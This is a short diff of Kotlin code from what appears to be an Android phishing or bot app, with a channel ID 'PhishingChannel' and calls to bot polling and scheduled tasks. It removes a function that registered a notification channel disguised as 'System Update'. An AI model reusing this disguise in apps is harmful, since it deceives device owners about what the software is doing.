@@ -91,19 +91,7 @@ private val CHANNEL_ID = "PhishingChannel"
 
     startBotPolling()
     scheduleAutoTasks()
-}
-
-private fun createNotificationChannel() {
-    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-        val channel = NotificationChannel(
-            CHANNEL_ID,
-            "System Update",
-            NotificationManager.IMPORTANCE_LOW
-        )
-        val manager = getSystemService(NotificationManager::class.java)
-        manager.createNotificationChannel(channel)
-    }
-}
+   }
  
 
     
